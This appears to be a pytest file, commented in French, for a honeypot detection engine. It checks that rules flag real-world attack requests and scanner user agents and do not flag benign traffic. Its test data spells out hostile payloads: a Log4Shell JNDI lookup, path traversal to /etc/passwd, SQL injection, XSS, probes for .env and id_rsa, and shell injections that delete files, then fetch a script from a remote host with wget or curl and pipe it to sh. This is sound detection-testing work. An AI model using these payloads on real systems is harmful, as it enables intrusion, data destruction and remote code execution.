"""Couverture de détection : les attaques réelles courantes sont reconnues, le trafic anodin non.

Chaque cas est une attaque effectivement observée sur des honeypots exposés. Avant
cette suite, la plupart n'étaient « détectées » que par R-005 (connexion sans
identifiant), avec un score de 8 et le profil « balayage ».
"""

import random
from ipaddress import IPv4Address

import pytest

from shield.collector.defender import DefenderAgent, RuleEngine
from shield.collector.enrichment.mitre import MitreMapper
from shield.common.schema import AttackerProfile, NormalizedEvent, RawEvent, Severity
from shield.tools.fake_events import make_event

AGENT = DefenderAgent(engine=RuleEngine.from_file("rules/detection_rules.yaml"))
MAPPER = MitreMapper()
PORTS = {"ssh": 22, "http": 80, "ftp": 21}


def verdict_for(service="http", payload=b"", username="", password="", counters=None):
    raw = RawEvent(
        service=service,
        source_ip=IPv4Address("203.0.113.50"),
        source_port=40000,
        dest_port=PORTS[service],
        username=username,
        password=password,
        payload=payload,
    ).truncated()
    event = NormalizedEvent(
        **raw.model_dump(exclude={"payload"}), payload=raw.payload, technique_id=MAPPER.map(raw)
    )
    return event, AGENT.evaluate(event, counters or {})


EXPLOITATION = AttackerProfile.EXPLOITATION_ATTEMPT


@pytest.mark.parametrize(
    "payload,rule,technique",
    [
        (b"GET /?x=${jndi:ldap://198.51.100.9/a} HTTP/1.1", "R-015", "T1190"),
        (b"GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1", "R-015", "T1190"),
        (b"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", "R-015", "T1190"),
        (b"POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1", "R-015", "T1190"),
        (
            b"GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
            "R-015",
            "T1190",
        ),
        (
            b"GET /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.9/x.sh;sh+x.sh HTTP/1.1",
            "R-010",
            "T1059",
        ),
        (b"POST / HTTP/1.1\r\n\r\ncd /tmp; curl http://198.51.100.9/a | sh", "R-010", "T1059"),
        (b"GET /index.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1", "R-011", "T1190"),
        (b"GET /item?id=1+union+select+1,2,3 HTTP/1.1", "R-011", "T1190"),
        (b"GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", "R-016", "T1190"),
        (b"GET /..%5c..%5cwindows/win.ini HTTP/1.1", "R-009", "T1083"),
        (b"GET /.env HTTP/1.1", "R-017", "T1083"),
        (b"GET /.git/config HTTP/1.1", "R-017", "T1083"),
        (b"GET /backup/id_rsa HTTP/1.1", "R-017", "T1083"),
    ],
)
def test_les_exploits_reels_sont_reconnus_comme_tels(payload, rule, technique):
    event, verdict = verdict_for(payload=payload)
    assert rule in {match.rule_id for match in verdict.matches}
    assert verdict.profile is EXPLOITATION
    assert verdict.threat_score >= 30
    assert event.technique_id == technique
    assert verdict.is_consistent()


@pytest.mark.parametrize(
    "user_agent",
    [
        "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
        "sqlmap/1.7.2#stable (https://sqlmap.org)",
        "Mozilla/5.00 (Nikto/2.1.6)",
        "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
        "Go-http-client/1.1",
    ],
)
def test_les_scanners_connus_sont_reconnus(user_agent):
    payload = f"GET / HTTP/1.1\r\nUser-Agent: {user_agent}\r\n\r\n".encode()
    _, verdict = verdict_for(payload=payload)
    assert "R-012" in {match.rule_id for match in verdict.matches}


@pytest.mark.parametrize(
    "service,username,password",
    [("ssh", "ubuntu", "Ubuntu2024!"), ("ftp", "anonymous", "anonymous@"), ("http", "jdoe", "")],
)
def test_toute_tentative_d_identifiant_sur_un_leurre_compte(service, username, password):
    """Personne de légitime ne se connecte à un leurre : détectée, mais à poids faible."""
    _, verdict = verdict_for(service, username=username, password=password)
    assert "R-019" in {match.rule_id for match in verdict.matches}
    assert 0 < verdict.threat_score < 20


@pytest.mark.parametrize("service", ["ftp", "http"])
def test_la_force_brute_est_reconnue_sur_tous_les_services(service):
    counters = {"auth_attempts_by_ip": 25, "distinct_services_by_ip": 1, "events_by_ip_24h": 25}
    _, verdict = verdict_for(service, username="admin", password="x9!k", counters=counters)
    assert "R-018" in {match.rule_id for match in verdict.matches}
    assert verdict.profile is AttackerProfile.TARGETED_BRUTEFORCE


@pytest.mark.parametrize(
    "payload",
    [
        b"GET /index.html HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Firefox/131.0\r\n\r\n",
        b"GET /api/users?id=42&sort=name HTTP/1.1\r\nHost: x\r\n\r\n",
        b"POST /contact HTTP/1.1\r\n\r\nname=Jean&message=Bonjour%2C+je+voudrais+un+devis",
        b"GET /static/app.3f2a.js HTTP/1.1\r\nAccept: */*\r\n\r\n",
        b"GET /blog/unmapped-regions-of-the-environment HTTP/1.1\r\n\r\n",
        b"GET /docs/shell-scripting-tutorial HTTP/1.1\r\n\r\n",
    ],
)
def test_pas_de_faux_positif_sur_le_trafic_anodin(payload):
    """Seule R-005 (connexion sans identifiant, sévérité faible) peut se déclencher."""
    _, verdict = verdict_for(payload=payload)
    assert all(match.severity is Severity.LOW for match in verdict.matches), verdict.matches
    assert verdict.threat_score <= 8
    assert verdict.profile is not EXPLOITATION


def test_le_generateur_est_presque_entierement_detecte():
    """Objectif SMART : ≥ 80 % de détection. Sur le générateur, sans compteurs, on vise plus."""
    rng = random.Random(1337)
    detected = 0
    for _ in range(2000):
        raw = make_event(rng).truncated()
        event = NormalizedEvent(**raw.model_dump(exclude={"payload"}), payload=raw.payload)
        detected += AGENT.evaluate(event).threat_score > 0
    assert detected / 2000 >= 0.95


def test_les_exploits_du_generateur_sont_classes_exploitation():
    rng = random.Random(42)
    for _ in range(500):
        raw = make_event(rng).truncated()
        if raw.username or raw.password or raw.service.value != "http":
            continue
        if b"zgrab" in raw.payload or b"masscan" in raw.payload or raw.payload.startswith(b"HEAD"):
            continue
        event = NormalizedEvent(**raw.model_dump(exclude={"payload"}), payload=raw.payload)
        assert AGENT.evaluate(event).profile is EXPLOITATION, raw.payload
